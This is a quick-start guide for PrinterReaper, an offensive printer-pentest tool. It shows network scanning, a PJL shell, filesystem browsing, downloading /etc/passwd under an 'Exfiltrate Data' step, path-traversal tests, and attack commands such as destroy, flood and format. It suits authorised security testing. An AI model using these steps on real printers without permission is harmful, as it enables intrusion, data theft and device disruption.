# 🚀 Quick Start Guide

Get started with PrinterReaper in 5 minutes!

---

## ⚡ 5-Minute Tutorial

### Step 1: Discover Printers (30 seconds)

```bash
# Run without arguments to discover printers on your network
python3 printer-reaper.py

# Output:
Detected OS: Linux
Found 2 network(s) to consider:
  [1] 192.168.1.0/24 (254 hosts)

Select networks to scan [e.g. 1,1-3,all]: 1

Scanning 192.168.1.0/24 (Ctrl+C to cancel)...
  192.168.1.100: Printer → HP LaserJet 4250, uptime=10:21:49, status=Ready
  192.168.1.105: Printer → Brother MFC-7860DW, uptime=16:31:17, status=Sleep

Probed 254 hosts in total.

Discovered printers:
192.168.1.100    HP LaserJet 4250
192.168.1.105    Brother MFC-7860DW
```

### Step 2: Connect to Printer (10 seconds)

```bash
# Connect using discovered IP
python3 printer-reaper.py 192.168.1.100 pjl

# Output:
   _____________________________________________________________   
  /___________________________________________________________/|   
 | |=========================================================| |   
 | |                                                         | |   
 | |  ____________   __________   ________________________   | |   
 | | | [] [] []  | |  ________ | |  . . .  . . .  . . .  |   | |   
 | | |___________| | |  ____  || |________________________|  | |   
 | |---------------| | |____| || |-------------------------- | |   
 | |  ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___    | |   
 | | |___|___|___|___|___|___|___|___|___|___|___|___|___|   | |   
 | |_________________________________________________________| |   
 | |-------------------  OUTPUT TRAY  ---------------------- | |   
 | |_________________________________________________________|/|   
 |  ______________________   ___________________________       |   
 | |                     |   |                          |      |   
 | |      PAPER BIN      |   |      SUPPLY DRAWER       |      |   
 | |_____________________|   |__________________________|      |   
 |___________________________________________________________|/   
|___________________[====   PAPER   ====]___________________/   

PrinterReaper :: Vulnerability & Offensive Intrusion Device for PRINTers
Version 2.3.4
Author : Andre Henrique
Contact: X / LinkedIn @mrhenrike

feast on paper, harvest vulnerabilities

>> Detected OS: Linux
>> Starting PrinterReaper (Advanced Printer Penetration Testing)

Checking for IPP support:         found
Checking for HTTP support:        found
Checking for HTTPS support:       not found
Checking for SNMP support:        found
Checking for PJL support:         found

Welcome to the PrinterReaper shell. Type help or ? to list commands.
192.168.1.100:/> 
```

### Step 3: Identify Printer (10 seconds)

```bash
# Get printer information
192.168.1.100:/> id

PJL Printer Identification & System Information:
============================================================
Device ID: HP LaserJet 4250

Firmware/Version Information:
IN TRAYS [1 250 4 6 7]
IN SIZES [LETTER LEGAL A4 EXEC]
DUPLEX [ON OFF]

Product Information:
HP LaserJet 4250

Page Count: 123456
```

### Step 4: Browse Filesystem (30 seconds)

```bash
# List files and directories
192.168.1.100:/> ls

d        -   0:
d        -   1:
-     1276   .profile
d        -   bin
d        -   dev
d        -   etc
d        -   webServer

# Change to etc directory
192.168.1.100:/> cd etc

# List contents
192.168.1.100:/etc> ls

-      834   passwd
-      156   hosts
-     2048   config.xml
d        -   ssl
```

### Step 5: Exfiltrate Data (1 minute)

```bash
# Download sensitive file
192.168.1.100:/etc> download passwd

Downloaded passwd to ./passwd

# View file contents
192.168.1.100:/etc> cat passwd

root:x:0:0:root:/root:/bin/sh
admin:x:1000:1000:admin:/home/admin:/bin/sh
```

### Step 6: Get Network Info (30 seconds)

```bash
# Get comprehensive network information
192.168.1.100:/etc> network

Network Information:
==================================================
Network Configuration:
IP=192.168.1.100
SUBNET=255.255.255.0
GATEWAY=192.168.1.1

IP Configuration:
DHCP=ON
MAC=00:11:22:33:44:55
```

### Step 7: Disconnect (5 seconds)

```bash
# Exit PrinterReaper
192.168.1.100:/etc> exit

# Back to your shell
$
```

---

## 🎯 Common First Tasks

### Task 1: Reconnaissance

```bash
# Connect to printer
python3 printer-reaper.py 192.168.1.100 pjl

# Get full information
> id
> network
> info config
> variables
> pagecount
```

### Task 2: File System Exploration

```bash
# Browse directories
> ls
> cd etc
> ls
> find /

# Download interesting files
> download /etc/passwd
> download /etc/config.xml
> download /webServer/default.htm
```

### Task 3: Configuration Backup

```bash
# Backup current configuration
> backup printer_backup_$(date +%Y%m%d).cfg

# List all volumes
> pwd

# Mirror entire filesystem
> mirror
```

### Task 4: Security Testing

```bash
# Test file permissions
> permissions /etc/passwd
> permissions /etc/shadow

# Try path traversal
> cd ../../../
> ls

# Test write access
> touch test.txt
> delete test.txt
```

---

## 🎓 Interactive Tutorial

### Example Session

```bash
$ python3 printer-reaper.py 192.168.1.100 pjl

192.168.1.100:/> help

Available commands (type help <topic>):
========================================
📁 Filesystem: ls mkdir find upload download delete copy move touch chmod permissions rmdir mirror
ℹ️  Information: id variables printenv network info
⚙️  Control: set display offline restart reset selftest backup restore
🔒 Security: lock unlock disable nvram
💥 Attacks: destroy flood hold format
🌐 Network: direct execute
📊 Monitoring: pagecount status

192.168.1.100:/> help ls

ls - List directory contents
============================================================
DESCRIPTION:
  Lists files and directories in the current or specified path.
  Shows file sizes, names, and directory indicators.

USAGE:
  ls [path]

EXAMPLES:
  ls                           # List current directory
  ls /etc                      # List /etc directory
  ls 0:/                       # List volume 0

NOTES:
  - Shows 'd' for directories, '-' for files
  - File sizes shown in bytes
  - Use find for recursive listing

192.168.1.100:/> ls

d        -   0:
d        -   1:
-     1276   .profile
d        -   etc

192.168.1.100:/> cd etc
192.168.1.100:/etc> ls

-      834   passwd
-      156   hosts

192.168.1.100:/etc> download passwd

Downloaded passwd to ./passwd

192.168.1.100:/etc> exit
```

---

## 📚 Learn More

### Get Help on Any Command

```bash
# General help
> help

# Specific command help
> help <command>

# Examples:
> help upload
> help lock
> help execute
```

### Explore Command Categories

```bash
# List commands by category
> help filesystem
> help security
> help attacks
```

---

## 🎯 Next Steps

Now that you're up and running:

1. **[Commands Reference](Commands-Reference)** - Learn all available commands
2. **[PJL Commands](PJL-Commands)** - Deep dive into PJL commands
3. **[Security Testing](Security-Testing)** - Learn security testing workflows
4. **[Examples](Examples)** - Real-world attack scenarios

---

## 💡 Pro Tips

### Tip 1: Use Safe Mode
```bash
# Verify PJL support before connecting
python3 printer-reaper.py --safe 192.168.1.100 pjl
```

### Tip 2: Load Command Files
```bash
# Automate tests with command files
echo "id\nls\nnetwork\nexit" > commands.txt
python3 printer-reaper.py -i commands.txt 192.168.1.100 pjl
```

### Tip 3: Log Everything
```bash
# Log all PJL commands to file
python3 printer-reaper.py -o session.log 192.168.1.100 pjl
```

### Tip 4: Debug Mode
```bash
# See raw traffic for troubleshooting
python3 printer-reaper.py --debug 192.168.1.100 pjl
```

---

## ⚠️ Safety Reminders

Before testing:
- ✅ Ensure you have written permission
- ✅ Test on non-production printers first
- ✅ Backup printer configuration
- ✅ Understand each command before using
- ❌ Never test on unauthorized devices

---

<div align="center">

**Ready to explore?**

**→ [Commands Reference](Commands-Reference)**

**→ [PJL Commands Details](PJL-Commands)**

</div>

